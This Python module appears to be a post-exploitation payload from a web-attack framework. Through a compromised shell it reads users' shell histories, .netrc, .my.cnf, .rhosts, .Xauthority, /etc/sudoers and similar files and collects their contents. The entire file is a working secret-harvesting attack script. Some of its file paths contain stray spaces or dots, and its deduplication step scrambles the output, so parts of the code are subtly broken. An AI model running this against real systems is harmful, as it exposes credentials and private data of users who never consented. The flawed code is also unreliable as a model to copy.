import re
from plugins.attack.payloads.base_payload import base_payload

class config_files(base_payload):
    '''
    This payload uses "users_folders" payload to find ".rc" and other configuration files, 
    some of them may contain sensitive information.
    '''
    def run_read(self):
        result = []
        config_files = []

        folders = run_payload('users_folders')
        for folder in folders:
            config_files.append(folder+'.bashrc')
            config_files.append(folder+'.bashrc~')
            config_files.append(folder+'.bash_history')
            config_files.append(folder+'.bash_profile')
            config_files.append(folder+'.gtk-bookmarks')
            config_files.append(folder+'.conkyrc')
            config_files.append(folder+'.my.cnf')
            config_files.append(folder+'.mysql_history.')
            config_files.append(folder+'.ldaprc ')
            config_files.append(folder+'.emacs')
            config_files.append(folder+'.bash_logout')
            config_files.append(folder+'.bash_login ')
            config_files.append(folder+'.hushlogin')
            config_files.append(folder+'.mail.rc')
            config_files.append(folder+'.profile ')
            config_files.append(folder+'.vimrc')
            config_files.append(folder+'.gtkrc')
            config_files.append(folder+'.kderc')
            config_files.append(folder+'.netrc')
            config_files.append(folder+'.rhosts')
            config_files.append(folder+'.Xauthority')
            config_files.append(folder+'.cshrc')
            config_files.append(folder+'.login')
            

        config_files.append('/etc/sudoers')
        config_files.append('/etc/inittab')
        config_files.append('/etc/crontab')
        config_files.append('/etc/sysctl.conf')
        config_files.append('/etc/mailname')
        config_files.append('/etc/aliases')
        config_files.append('/etc/pam.conf')

        for file in config_files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = list(set(result))
        result = [p for p in result if p != '']
        return result
